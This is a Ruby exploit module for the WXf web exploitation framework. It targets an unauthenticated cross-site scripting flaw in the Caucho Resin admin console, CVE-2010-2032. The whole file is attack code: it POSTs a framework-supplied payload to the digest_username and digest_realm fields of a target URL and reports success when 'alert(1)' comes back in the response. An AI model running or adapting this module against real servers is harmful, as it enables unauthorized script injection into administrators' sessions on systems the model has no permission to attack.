class WebXploit < WXf::WXfmod_Factory::Exploit

include WXf::WXfassists::General::MechReq

def initialize
  super(
   'Name'        => 'Caucho Resin admin console XSS',
   'Version'     => '1.0',
   'Description' => %q{ Unauthenticated XSS in the Resin admin form using digest_username and digest_realm input fields
   Credits to flyh4t. 
                    },
   'Author'	 => [ 'theinfinitenigma' ],
   'References'	 => [ 'URL', 'http://packetstormsecurity.org/files/89658/cauchoresin312-xss.txt' ],
   'CVE' 	 =>'CVE-2010-2032',
   'License'	 => WXF_LICENSE
  )

end

def exploit

	content_type_data = "application/x-www-form-urlencoded\r\n"

	content_type_data_hash = datahash['content_type_data']

 	res = mech_req({
                    'method'=> 'POST',
                    'RURL'  => rurl,
		    'HEADERS' => {
			'Content-Type' => content_type_data_hash
			},
                    'RPARAMS' => payload.payload_data
                  })  

	if (rce_code)
      		prnt_err("The following error has occured: #{rce_code}")
	end

	if (res)
		if (/alert\(1\)/.match(res.body) != nil)
			$stdout.puts("Exploit was successful!\r\n")
		else $stdout.puts("Unable to verify success...\r\n")
#			$stdout.puts(res.body)
		end
	end

end

end
